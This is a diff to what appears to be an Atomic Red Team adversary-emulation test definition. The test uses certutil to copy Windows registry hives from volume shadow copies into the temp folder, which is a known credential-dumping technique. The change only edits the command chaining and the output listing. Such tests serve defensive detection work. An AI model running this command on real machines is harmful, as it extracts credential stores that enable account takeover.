@@ -121,7 +121,7 @@ atomic_tests:
       default: 10
   executor:
     command: |
-      for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) && dir /B %temp%\#{target_hive}vss%a
+      for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
     name: command_prompt
     elevation_required: false
     cleanup_command: |
